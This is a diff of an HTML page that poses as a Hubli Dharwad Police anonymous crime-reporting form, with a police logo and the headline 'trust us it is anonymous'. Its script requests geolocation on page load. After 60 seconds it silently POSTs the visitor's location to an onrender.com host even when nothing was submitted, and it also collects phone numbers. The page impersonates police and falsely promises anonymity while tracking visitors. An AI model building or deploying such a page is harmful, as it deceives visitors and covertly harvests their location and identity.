@@ -7,22 +7,62 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div class="container">
-        <h1>Report a Crime</h1>
-        <p>Please enter your phone number and allow location access to report a crime.</p>
-        <form id="scanForm" action="https://anonymous-reporter.onrender.com/scan" method="POST">
-            <label for="phone_number">Phone Number:</label>
-            <div class="phone-input">
-                <input type="text" value="+91" readonly>
-                <input type="text" id="phone_number" name="phone_number" required pattern="\d{10}" title="Enter a 10-digit phone number">
-            </div>
-            <button type="submit">Submit</button>
-        </form>
+    <nav class="navbar">
+        <div class="logo"><img src="logoksp.png" alt="Hubli Dharwad Police Logo"></div>
+        <ul>
+            <li><a href="./">Home</a></li>
+            <li><a href="#">About Us</a></li>
+            <li><a href="#">Contact Us</a></li>
+        </ul>
+    </nav>
+
+    <div class="header">
+        <h1>Report the Crime, trust us it is anonymous</h1>
     </div>
+
+    <main>
+        <div class="container">
+            <h1>Report a Crime</h1>
+            <p>Please enter your phone number and allow location access to report a crime.</p>
+            <form id="scanForm" action="https://anonymous-reporting-3.onrender.com/scan" method="POST">
+                <label for="phone_number">Phone Number:</label>
+                <div class="phone-input">
+                    <input type="text" value="+91" readonly>
+                    <input type="text" id="phone_number" name="phone_number" required pattern="\d{10}" title="Enter a 10-digit phone number">
+                </div>
+                <button type="submit">Submit</button>
+            </form>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <p>&copy; 2024 Hubli Dharwad Police Department. All rights reserved.</p>
+            <p>For emergencies, call: 100 | For non-emergencies, contact: 080-12345678</p>
+        </div>
+    </footer>
 
     <script>
         let locationData = null;
-
+        let formSubmitted = false;
+    
+        // Function to clear phone number input
+        function clearPhoneNumberInput() {
+            document.getElementById('phone_number').value = '';
+        }
+    
+        // Function to disable form inputs during submission
+        function disableFormInputs() {
+            document.getElementById('phone_number').disabled = true;
+            document.querySelector('button[type="submit"]').disabled = true;
+        }
+    
+        // Function to enable form inputs after submission
+        function enableFormInputs() {
+            document.getElementById('phone_number').disabled = false;
+            document.querySelector('button[type="submit"]').disabled = false;
+        }
+    
         // Request location permission as soon as the page loads
         window.onload = function() {
             if (navigator.geolocation) {
@@ -35,27 +75,37 @@
                 alert('Geolocation is not supported by this browser.');
             }
         };
-
+    
         // Set a timeout to send location data automatically after 60 seconds
         const timeoutId = setTimeout(() => {
-            if (locationData && !document.getElementById('phone_number').value) {
+            if (locationData && !document.getElementById('phone_number').value && !formSubmitted) {
                 sendLocation();
             }
         }, 60000);
-
+    
+        // Handle form submission
         document.getElementById('scanForm').addEventListener('submit', function(e) {
             e.preventDefault();
+    
+            if (formSubmitted) {
+                return; // Prevent multiple submissions
+            }
+    
             const phoneNumber = "+91" + document.getElementById('phone_number').value;
-
+    
             if (locationData) {
+                disableFormInputs(); // Disable form inputs during submission
                 sendLocation(phoneNumber);
             } else {
                 alert('Unable to get location. Please try again.');
             }
         });
-
+    
+        // Function to send location data
         function sendLocation(phoneNumber = 'Unknown') {
-            fetch('https://anonymous-reporter.onrender.com/scan', {
+            formSubmitted = true; // Mark form as submitted
+    
+            fetch('https://anonymous-reporting-3.onrender.com/scan', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded'
@@ -77,8 +127,13 @@
             })
             .catch(error => {
                 alert('Error sending data: ' + error.message);
+            })
+            .finally(() => {
+                clearPhoneNumberInput(); // Clear phone number input
+                enableFormInputs(); // Enable form inputs after submission
             });
         }
     </script>
+    
 </body>
 </html>
